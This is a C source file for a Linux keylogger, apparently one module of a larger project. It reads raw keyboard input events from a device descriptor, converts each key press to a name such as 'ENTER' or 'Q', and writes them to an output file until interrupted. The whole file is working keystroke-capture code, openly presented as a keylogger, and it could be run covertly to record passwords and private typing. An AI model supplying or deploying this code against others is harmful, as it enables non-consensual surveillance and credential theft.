#include "keylogger.h"
#include <linux/input.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

const char *keys_str[] = {
    "RESERVED",   "ESC",      "1",          "2",
    "3",          "4",        "5",          "6",
    "7",          "8",        "9",          "0",
    "MINUS",      "EQUAL",    "BACKSPACE",  "TAB",
    "Q",          "W",        "E",          "R",
    "T",          "Y",        "U",          "I",
    "O",          "P",        "LEFTBRACE",  "RIGHTBRACE",
    "ENTER",      "LEFTCTRL", "A",          "S",
    "D",          "F",        "G",          "H",
    "J",          "K",        "L",          "SEMICOLON",
    "APOSTROPHE", "GRAVE",    "LEFTSHIFT",  "BACKSLASH",
    "Z",          "X",        "C",          "V",
    "B",          "N",        "M",          "COMMA",
    "DOT",        "SLASH",    "RIGHTSHIFT", "KPASTERISK",
    "LEFTALT",    "SPACE",    "CAPSLOCK"};

int loop = 1;

void sig_handler(int sig) { loop = 0; }

static void write_file(int fd, const char *str) { 
  int size = strlen(str);
  write(fd, str, size);
  write(fd, "\n", 1);
}

void keylogger(int keyboard, int out) {
  const int input_size = sizeof(struct input_event);
  struct input_event *keys = malloc(input_size * KEY_BUFFER);
  int nbytes = 0;

  signal(SIGINT, sig_handler);

  while (loop) {
    nbytes = read(keyboard, keys, input_size * KEY_BUFFER);

    for (int i = 0; i < nbytes / input_size; i++) {
      if (keys[i].type == EV_KEY && keys[i].value == 1) {
        if (keys[i].code <= KEY_CAPSLOCK) {
          write_file(out, keys_str[keys[i].code]);
        } else {
          write_file(out, "UNRECOGNIZED");
        }
      }
    }
  }
  free(keys);
}